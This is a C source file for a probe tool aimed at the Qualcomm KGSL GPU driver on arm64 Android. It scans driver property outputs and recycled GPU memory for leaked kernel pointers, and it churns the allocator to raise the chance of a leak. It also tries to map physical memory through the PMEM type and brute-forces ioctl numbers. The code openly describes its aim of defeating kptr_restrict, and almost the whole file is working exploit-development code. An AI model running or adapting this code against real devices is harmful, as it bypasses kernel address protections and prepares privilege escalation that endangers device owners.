/*
 * kgsl_probe2.c — KGSL probe v2: fixed struct sizes + kernel pointer scanning
 *
 * Fixes from v1:
 *   - sizebytes in getproperty is size_t (8 bytes on arm64), not unsigned int
 *   - Added __pad field to gpumem_alloc_id
 *   - Scans uninitialized GPU memory for kernel pointers
 *   - Tries multiple alloc sizes to maximize data leak surface
 *
 * Cross-compile:
 *   aarch64-linux-musl-gcc -static -O2 -o kgsl_probe2 kgsl_probe2.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>

#define KGSL_IOC_TYPE 0x09

/* Properties */
#define KGSL_PROP_DEVICE_INFO       0x1
#define KGSL_PROP_DEVICE_SHADOW     0x2
#define KGSL_PROP_DEVICE_POWER      0x3
#define KGSL_PROP_SHMEM             0x4
#define KGSL_PROP_SHMEM_APERTURES   0x5
#define KGSL_PROP_MMU_ENABLE        0x6
#define KGSL_PROP_INTERRUPT_WAITS   0x7
#define KGSL_PROP_VERSION           0x8
#define KGSL_PROP_GPU_RESET_STAT    0x9
#define KGSL_PROP_PWRCTRL           0xE
#define KGSL_PROP_PWR_CONSTRAINT    0x12
#define KGSL_PROP_UCHE_GMEM_VADDR  0x13
#define KGSL_PROP_SP_GENERIC_MEM   0x14

/* Memory types */
#define KGSL_USER_MEM_TYPE_PMEM     0x00000000
#define KGSL_USER_MEM_TYPE_ADDR     0x00000001
#define KGSL_USER_MEM_TYPE_ASHMEM   0x00000002
#define KGSL_USER_MEM_TYPE_ION      0x00000003

/*
 * Corrected structs for 64-bit ARM (aarch64).
 * Key: size_t and void* are 8 bytes, unsigned int is 4 bytes.
 */

/* GETPROPERTY: sizebytes must be size_t (8 bytes on arm64) */
struct kgsl_device_getproperty {
    unsigned int type;
    void *value;
    size_t sizebytes;
};

struct kgsl_devinfo {
    unsigned int device_id;
    unsigned int chip_id;
    unsigned int mmu_enabled;
    unsigned long gmem_gpubaseaddr;
    unsigned int gpu_id;
    unsigned int gmem_sizebytes;
};

struct kgsl_version {
    unsigned int drv_major;
    unsigned int drv_minor;
    unsigned int dev_major;
    unsigned int dev_minor;
};

/* Legacy GPUMEM_ALLOC — known to work */
struct kgsl_gpumem_alloc {
    unsigned long gpuaddr;
    size_t size;
    unsigned int flags;
};

/* GPUMEM_ALLOC_ID — includes __pad field */
struct kgsl_gpumem_alloc_id {
    unsigned int id;
    unsigned int flags;
    size_t size;
    size_t mmapsize;
    unsigned long gpuaddr;
    unsigned long __pad;
};

struct kgsl_gpumem_free_id {
    unsigned int id;
};

struct kgsl_gpumem_get_info {
    unsigned long gpuaddr;
    unsigned int id;
    unsigned int flags;
    size_t size;
    size_t mmapsize;
    unsigned long useraddr;
};

struct kgsl_map_user_mem {
    int fd;
    unsigned long gpuaddr;
    size_t len;
    size_t offset;
    unsigned long hostptr;
    unsigned int memtype;
    unsigned int flags;
};

struct kgsl_sharedmem_free {
    unsigned long gpuaddr;
};

struct kgsl_drawctxt_create {
    unsigned int flags;
    unsigned int drawctxt_id;
};

/* ioctl definitions with corrected struct sizes */
#define IOCTL_KGSL_DEVICE_GETPROPERTY \
    _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)

#define IOCTL_KGSL_MAP_USER_MEM \
    _IOW(KGSL_IOC_TYPE, 0x0A, struct kgsl_map_user_mem)

#define IOCTL_KGSL_DRAWCTXT_CREATE \
    _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

#define IOCTL_KGSL_SHAREDMEM_FREE \
    _IOW(KGSL_IOC_TYPE, 0x15, struct kgsl_sharedmem_free)

#define IOCTL_KGSL_GPUMEM_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x2F, struct kgsl_gpumem_alloc)

#define IOCTL_KGSL_GPUMEM_ALLOC_ID \
    _IOWR(KGSL_IOC_TYPE, 0x34, struct kgsl_gpumem_alloc_id)

#define IOCTL_KGSL_GPUMEM_FREE_ID \
    _IOW(KGSL_IOC_TYPE, 0x35, struct kgsl_gpumem_free_id)

#define IOCTL_KGSL_GPUMEM_GET_INFO \
    _IOWR(KGSL_IOC_TYPE, 0x36, struct kgsl_gpumem_get_info)

static int kgsl_fd = -1;

static int kgsl_getproperty(unsigned int type, void *value, size_t size) {
    struct kgsl_device_getproperty prop = {
        .type = type,
        .value = value,
        .sizebytes = size,
    };
    return ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop);
}

/*
 * Test 1: Device info and MMU status with corrected structs
 */
static void test_device_info(void) {
    printf("\n=== Test 1: Device Information (fixed structs) ===\n");
    printf("  sizeof(getproperty): %zu\n", sizeof(struct kgsl_device_getproperty));
    printf("  sizeof(devinfo):     %zu\n", sizeof(struct kgsl_devinfo));
    printf("  GETPROPERTY ioctl:   0x%lx\n", (unsigned long)IOCTL_KGSL_DEVICE_GETPROPERTY);
    printf("  GPUMEM_ALLOC ioctl:  0x%lx\n", (unsigned long)IOCTL_KGSL_GPUMEM_ALLOC);

    struct kgsl_devinfo info;
    memset(&info, 0, sizeof(info));
    int ret = kgsl_getproperty(KGSL_PROP_DEVICE_INFO, &info, sizeof(info));
    if (ret < 0) {
        printf("  DEVICE_INFO: %s (errno=%d)\n", strerror(errno), errno);

        /* Try with smaller struct (maybe gmem_gpubaseaddr is unsigned int) */
        unsigned char buf[64];
        memset(buf, 0, sizeof(buf));
        for (size_t sz = 16; sz <= 40; sz += 4) {
            ret = kgsl_getproperty(KGSL_PROP_DEVICE_INFO, buf, sz);
            if (ret == 0) {
                printf("  DEVICE_INFO succeeded with size=%zu!\n", sz);
                printf("  Data: ");
                for (size_t i = 0; i < sz; i++) printf("%02x ", buf[i]);
                printf("\n");
                break;
            }
        }
    } else {
        printf("  device_id:        0x%x\n", info.device_id);
        printf("  chip_id:          0x%08x\n", info.chip_id);
        printf("  mmu_enabled:      %d\n", info.mmu_enabled);
        printf("  gmem_gpubaseaddr: 0x%lx\n", info.gmem_gpubaseaddr);
        printf("  gpu_id:           0x%x\n", info.gpu_id);
        printf("  gmem_sizebytes:   0x%x (%d KB)\n", info.gmem_sizebytes,
               info.gmem_sizebytes / 1024);

        if (!info.mmu_enabled) {
            printf("\n  >>> GPU has DIRECT physical memory access! <<<\n");
        }
    }

    /* Try version */
    struct kgsl_version ver;
    memset(&ver, 0, sizeof(ver));
    ret = kgsl_getproperty(KGSL_PROP_VERSION, &ver, sizeof(ver));
    if (ret == 0) {
        printf("  Driver version:   %d.%d\n", ver.drv_major, ver.drv_minor);
        printf("  Device version:   %d.%d\n", ver.dev_major, ver.dev_minor);
    } else {
        printf("  VERSION: %s (size=%zu)\n", strerror(errno), sizeof(ver));
    }

    /* Try MMU_ENABLE property directly */
    unsigned int mmu_val = 0;
    ret = kgsl_getproperty(KGSL_PROP_MMU_ENABLE, &mmu_val, sizeof(mmu_val));
    if (ret == 0) {
        printf("  MMU_ENABLE prop:  %u (%s)\n", mmu_val,
               mmu_val ? "MMU active" : "MMU DISABLED — direct physical!");
    } else {
        printf("  MMU_ENABLE prop:  %s\n", strerror(errno));
    }
}

/*
 * Test 2: Try all GETPROPERTY types to find data leaks
 */
static void test_all_properties(void) {
    printf("\n=== Test 2: GETPROPERTY Scan (all types 0x00-0x20) ===\n");

    for (unsigned int proptype = 0; proptype <= 0x20; proptype++) {
        unsigned char buf[256];
        memset(buf, 0xAA, sizeof(buf));  /* fill with pattern to detect writes */

        /* Try multiple sizes */
        for (size_t sz = 4; sz <= 128; sz *= 2) {
            memset(buf, 0xAA, sizeof(buf));
            int ret = kgsl_getproperty(proptype, buf, sz);
            if (ret == 0) {
                /* Check if data was actually written (not all 0xAA) */
                int changed = 0;
                for (size_t i = 0; i < sz; i++) {
                    if (buf[i] != 0xAA) { changed = 1; break; }
                }
                if (changed) {
                    printf("  prop 0x%02x size=%3zu: ", proptype, sz);
                    size_t print_sz = sz > 32 ? 32 : sz;
                    for (size_t i = 0; i < print_sz; i++) printf("%02x", buf[i]);
                    if (sz > 32) printf("...");
                    printf("\n");

                    /* Check for kernel pointers (0xffffffc0xxxxxxxx) */
                    uint64_t *ptrs = (uint64_t *)buf;
                    for (size_t i = 0; i < sz / 8; i++) {
                        if ((ptrs[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL) {
                            printf("    >>> KERNEL POINTER at offset %zu: 0x%016lx <<<\n",
                                   i * 8, ptrs[i]);
                        }
                    }
                }
                break;  /* found working size, move to next property */
            }
        }
    }
}

/*
 * Test 3: Scan uninitialized GPU memory for kernel pointers
 * GPU pages may not be zeroed before being given to userspace.
 * If they were previously used by the kernel, they leak addresses.
 */
static void test_gpu_memory_scan(void) {
    printf("\n=== Test 3: Uninitialized GPU Memory Scan ===\n");

    int total_kernel_ptrs = 0;
    int allocs_done = 0;
    size_t alloc_sizes[] = {4096, 8192, 16384, 65536, 262144, 1048576};
    int num_sizes = sizeof(alloc_sizes) / sizeof(alloc_sizes[0]);

    for (int s = 0; s < num_sizes; s++) {
        size_t sz = alloc_sizes[s];
        struct kgsl_gpumem_alloc alloc = {0};
        alloc.size = sz;
        alloc.flags = 0;

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc);
        if (ret < 0) {
            printf("  alloc %zu bytes: %s\n", sz, strerror(errno));
            continue;
        }

        /* mmap the GPU memory */
        void *mapped = mmap(NULL, sz, PROT_READ | PROT_WRITE,
                           MAP_SHARED, kgsl_fd, alloc.gpuaddr);
        if (mapped == MAP_FAILED) {
            printf("  alloc %zu bytes: mmap failed: %s\n", sz, strerror(errno));
            /* Free the GPU memory */
            struct kgsl_sharedmem_free fr = { .gpuaddr = alloc.gpuaddr };
            ioctl(kgsl_fd, IOCTL_KGSL_SHAREDMEM_FREE, &fr);
            continue;
        }

        allocs_done++;

        /* Scan for kernel pointers */
        uint64_t *data = (uint64_t *)mapped;
        int found_in_this = 0;
        int nonzero_count = 0;

        for (size_t i = 0; i < sz / 8; i++) {
            if (data[i] != 0) nonzero_count++;

            /* ARM64 kernel text: 0xFFFFFFC0_00000000 - 0xFFFFFFC0_FFFFFFFF */
            if ((data[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL) {
                if (found_in_this < 10) {
                    printf("  [%zuKB alloc] offset 0x%04zx: 0x%016lx (KERNEL TEXT)\n",
                           sz / 1024, i * 8, data[i]);
                }
                found_in_this++;
                total_kernel_ptrs++;
            }
            /* Kernel module/vmalloc area */
            if ((data[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFBF00000000ULL) {
                if (found_in_this < 10) {
                    printf("  [%zuKB alloc] offset 0x%04zx: 0x%016lx (KERNEL VMALLOC)\n",
                           sz / 1024, i * 8, data[i]);
                }
                found_in_this++;
                total_kernel_ptrs++;
            }
            /* Kernel linear mapping (physmem) */
            if ((data[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFE000000000ULL) {
                if (found_in_this < 10) {
                    printf("  [%zuKB alloc] offset 0x%04zx: 0x%016lx (KERNEL LINEAR MAP)\n",
                           sz / 1024, i * 8, data[i]);
                }
                found_in_this++;
                total_kernel_ptrs++;
            }
        }

        if (found_in_this > 10) {
            printf("  [%zuKB alloc] ... and %d more kernel pointers\n",
                   sz / 1024, found_in_this - 10);
        }

        printf("  [%zuKB alloc] gpuaddr=0x%lx, nonzero=%d/%zu, kernel_ptrs=%d\n",
               sz / 1024, alloc.gpuaddr, nonzero_count, sz / 8, found_in_this);

        /* Unmap and free */
        munmap(mapped, sz);
        struct kgsl_sharedmem_free fr = { .gpuaddr = alloc.gpuaddr };
        ioctl(kgsl_fd, IOCTL_KGSL_SHAREDMEM_FREE, &fr);
    }

    printf("\n  Total: %d allocations, %d kernel pointers found\n",
           allocs_done, total_kernel_ptrs);

    if (total_kernel_ptrs > 0) {
        printf("  >>> GPU MEMORY LEAKS KERNEL POINTERS! <<<\n");
        printf("  >>> This defeats kptr_restrict! <<<\n");
    } else {
        printf("  GPU memory appears to be zeroed. No pointer leaks.\n");
    }
}

/*
 * Test 4: Multiple rapid alloc/free cycles to increase leak chance
 * Kernel recycles pages — doing many alloc/free/alloc cycles increases
 * the chance of getting pages that were previously kernel-internal.
 */
static void test_gpu_recycle_scan(void) {
    printf("\n=== Test 4: GPU Page Recycle Scan ===\n");
    printf("  Doing 20 alloc/free cycles to churn GPU pages...\n");

    /* First: allocate and free many pages to churn the allocator */
    for (int i = 0; i < 20; i++) {
        struct kgsl_gpumem_alloc alloc = {0};
        alloc.size = 65536;  /* 64KB */
        alloc.flags = 0;
        if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) == 0) {
            struct kgsl_sharedmem_free fr = { .gpuaddr = alloc.gpuaddr };
            ioctl(kgsl_fd, IOCTL_KGSL_SHAREDMEM_FREE, &fr);
        }
    }

    /* Now allocate and scan — we might get recycled pages */
    printf("  Now scanning post-churn allocations...\n");
    int total_ptrs = 0;

    for (int round = 0; round < 5; round++) {
        struct kgsl_gpumem_alloc alloc = {0};
        alloc.size = 262144;  /* 256KB */
        alloc.flags = 0;
        if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0) continue;

        void *mapped = mmap(NULL, alloc.size, PROT_READ,
                           MAP_SHARED, kgsl_fd, alloc.gpuaddr);
        if (mapped == MAP_FAILED) {
            struct kgsl_sharedmem_free fr = { .gpuaddr = alloc.gpuaddr };
            ioctl(kgsl_fd, IOCTL_KGSL_SHAREDMEM_FREE, &fr);
            continue;
        }

        uint64_t *data = (uint64_t *)mapped;
        for (size_t i = 0; i < alloc.size / 8; i++) {
            uint64_t val = data[i];
            /* Any kernel-range pointer */
            if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
                if (total_ptrs < 20) {
                    printf("  round %d offset 0x%06zx: 0x%016lx\n",
                           round, i * 8, val);
                }
                total_ptrs++;
            }
        }

        munmap(mapped, alloc.size);
        struct kgsl_sharedmem_free fr = { .gpuaddr = alloc.gpuaddr };
        ioctl(kgsl_fd, IOCTL_KGSL_SHAREDMEM_FREE, &fr);
    }

    printf("  Post-churn scan: %d kernel-range values found\n", total_ptrs);
}

/*
 * Test 5: Try GPUMEM_ALLOC_ID with corrected struct
 */
static void test_alloc_id(void) {
    printf("\n=== Test 5: GPUMEM_ALLOC_ID (corrected struct) ===\n");
    printf("  sizeof(alloc_id): %zu\n", sizeof(struct kgsl_gpumem_alloc_id));
    printf("  ALLOC_ID ioctl:   0x%lx\n", (unsigned long)IOCTL_KGSL_GPUMEM_ALLOC_ID);

    struct kgsl_gpumem_alloc_id alloc = {0};
    alloc.size = 4096;
    alloc.flags = 0;

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc);
    if (ret < 0) {
        printf("  ALLOC_ID: %s (errno=%d)\n", strerror(errno), errno);

        /* Try without __pad (smaller struct) */
        struct {
            unsigned int id;
            unsigned int flags;
            size_t size;
            size_t mmapsize;
            unsigned long gpuaddr;
        } alloc_nopad = {0};
        alloc_nopad.size = 4096;

        unsigned long ioctl_nopad = _IOWR(KGSL_IOC_TYPE, 0x34, alloc_nopad);
        printf("  Trying without __pad (size=%zu, ioctl=0x%lx)...\n",
               sizeof(alloc_nopad), ioctl_nopad);
        ret = ioctl(kgsl_fd, ioctl_nopad, &alloc_nopad);
        if (ret == 0) {
            printf("  ALLOC_ID (no pad): SUCCESS! id=%u gpuaddr=0x%lx\n",
                   alloc_nopad.id, alloc_nopad.gpuaddr);
        } else {
            printf("  ALLOC_ID (no pad): %s\n", strerror(errno));
        }
    } else {
        printf("  ALLOC_ID: SUCCESS!\n");
        printf("    id=%u, gpuaddr=0x%lx, mmapsize=%zu\n",
               alloc.id, alloc.gpuaddr, alloc.mmapsize);
    }
}

/*
 * Test 6: MAP_USER_MEM with corrected structs
 */
static void test_map_user_mem(void) {
    printf("\n=== Test 6: MAP_USER_MEM (corrected struct) ===\n");
    printf("  sizeof(map_user_mem): %zu\n", sizeof(struct kgsl_map_user_mem));
    printf("  MAP_USER_MEM ioctl:  0x%lx\n", (unsigned long)IOCTL_KGSL_MAP_USER_MEM);

    /* Try to map a page of our own memory to GPU */
    void *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) {
        printf("  Can't allocate test page\n");
        return;
    }
    memset(page, 0x41, 4096);

    struct kgsl_map_user_mem map = {0};
    map.fd = -1;
    map.gpuaddr = 0;
    map.len = 4096;
    map.offset = 0;
    map.hostptr = (unsigned long)page;
    map.memtype = KGSL_USER_MEM_TYPE_ADDR;
    map.flags = 0;

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_MAP_USER_MEM, &map);
    if (ret < 0) {
        printf("  MAP_USER_MEM (ADDR): %s (errno=%d)\n", strerror(errno), errno);
    } else {
        printf("  MAP_USER_MEM (ADDR): SUCCESS! gpuaddr=0x%lx\n", map.gpuaddr);
        printf("  >>> Can map arbitrary user memory to GPU! <<<\n");

        struct kgsl_sharedmem_free fr = { .gpuaddr = map.gpuaddr };
        ioctl(kgsl_fd, IOCTL_KGSL_SHAREDMEM_FREE, &fr);
    }

    /* Try physical address mapping via PMEM type */
    struct kgsl_map_user_mem pmap = {0};
    pmap.fd = -1;
    pmap.gpuaddr = 0;
    pmap.len = 4096;
    pmap.offset = 0;
    pmap.hostptr = 0x00000000;  /* Physical address 0 */
    pmap.memtype = KGSL_USER_MEM_TYPE_PMEM;
    pmap.flags = 0;

    ret = ioctl(kgsl_fd, IOCTL_KGSL_MAP_USER_MEM, &pmap);
    if (ret < 0) {
        printf("  MAP_USER_MEM (PMEM @ 0x0): %s\n", strerror(errno));
    } else {
        printf("  MAP_USER_MEM (PMEM): SUCCESS! gpuaddr=0x%lx\n", pmap.gpuaddr);
        printf("  >>> CAN MAP PHYSICAL MEMORY! <<<\n");
    }

    munmap(page, 4096);
}

/*
 * Test 7: GPU context creation with different flags
 */
static void test_drawctxt(void) {
    printf("\n=== Test 7: GPU Context Creation ===\n");
    printf("  sizeof(drawctxt_create): %zu\n", sizeof(struct kgsl_drawctxt_create));

    /* Try various flag combinations */
    unsigned int flag_combos[] = {
        0,
        0x00000008,  /* PER_CONTEXT_TS */
        0x00000002,  /* PREAMBLE */
        0x0000000A,  /* PER_CONTEXT_TS | PREAMBLE */
        0x00000100,  /* type shift */
        0x00000200,
        0x00000300,
    };

    for (int i = 0; i < 7; i++) {
        struct kgsl_drawctxt_create ctx = {0};
        ctx.flags = flag_combos[i];
        int ret = ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx);
        if (ret == 0) {
            printf("  flags=0x%08x: SUCCESS! ctx_id=%u\n", flag_combos[i], ctx.drawctxt_id);
            /* Don't destroy — we might need it */
        } else {
            printf("  flags=0x%08x: %s\n", flag_combos[i], strerror(errno));
        }
    }
}

/*
 * Test 8: Brute-force ioctl number discovery
 * Try every ioctl number from 0x00 to 0x40 with a 4-byte arg
 * to find what the kernel actually accepts.
 */
static void test_ioctl_bruteforce(void) {
    printf("\n=== Test 8: IOCTL Brute Force (0x00-0x40) ===\n");

    for (int nr = 0; nr <= 0x40; nr++) {
        unsigned char buf[256];
        memset(buf, 0, sizeof(buf));

        /* Try different directions and sizes */
        unsigned long ioctls[] = {
            _IO(KGSL_IOC_TYPE, nr),
            _IOR(KGSL_IOC_TYPE, nr, uint32_t),
            _IOW(KGSL_IOC_TYPE, nr, uint32_t),
            _IOWR(KGSL_IOC_TYPE, nr, uint32_t),
            _IOR(KGSL_IOC_TYPE, nr, uint64_t),
            _IOW(KGSL_IOC_TYPE, nr, uint64_t),
            _IOWR(KGSL_IOC_TYPE, nr, uint64_t),
        };

        for (int d = 0; d < 7; d++) {
            memset(buf, 0, sizeof(buf));
            int ret = ioctl(kgsl_fd, ioctls[d], buf);
            if (ret == 0) {
                printf("  nr=0x%02x dir=%d size=%s: SUCCESS data=",
                       nr, d,
                       d < 4 ? "4" : "8");
                for (int b = 0; b < 16; b++) printf("%02x", buf[b]);
                printf("\n");
            } else if (errno == EINVAL) {
                /* EINVAL means the ioctl number is recognized but args are wrong */
                printf("  nr=0x%02x dir=%d size=%s: EINVAL (recognized!)\n",
                       nr, d,
                       d < 4 ? "4" : "8");
            }
            /* ENOTTY = not recognized, skip silently */
        }
    }
}

int main(void) {
    printf("=== KGSL Probe v2 — Fixed Struct Sizes + Kernel Pointer Scan ===\n");
    printf("PID: %d\n", getpid());

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        perror("open /dev/kgsl-3d0");
        return 1;
    }
    printf("Opened /dev/kgsl-3d0 (fd=%d)\n", kgsl_fd);

    test_device_info();
    test_all_properties();
    test_gpu_memory_scan();
    test_gpu_recycle_scan();
    test_alloc_id();
    test_map_user_mem();
    test_drawctxt();
    test_ioctl_bruteforce();

    printf("\n=== Done ===\n");
    close(kgsl_fd);
    return 0;
}
